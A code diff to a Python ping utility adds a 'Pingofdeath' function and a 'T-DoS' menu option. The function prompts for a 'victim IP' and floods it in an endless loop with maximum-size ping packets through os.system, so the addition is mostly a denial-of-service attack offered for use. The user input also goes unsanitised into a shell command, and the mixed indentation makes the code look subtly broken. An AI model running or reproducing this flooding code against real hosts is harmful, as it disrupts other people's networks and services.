@@ -64,6 +64,12 @@ def Ping_sl():
 	ping_number = input("Number of pings: ")
         for a in range(ping_number):
 		os.system("ping " + ip)
+def Pingofdeath():
+    victimIP = input("enter victim IP: ")
+    pingCommand = "ping " + victimIP + " -l 65500 -w 1 -n 1"
+        
+    while(1):
+        os.system(pingCommand)
 
 
 def main():
@@ -133,6 +139,14 @@ def main():
 	else:
 		print('IP reachable')
 		print(output)
+    elif option == 5:
+	os.system("clear")
+	print("  ______    ____       _____")
+        print(" /_  __/   / __ \____ / ___/")
+        print("  / /_____/ / / / __ \\__ \ ")
+        print(" / /_____/ /_/ / /_/ /__/ / ")
+        print("/_/     /_____/\____/____/  ")
+	Pingofdeath()
 	
 if __name__ == "__main__":
     main()
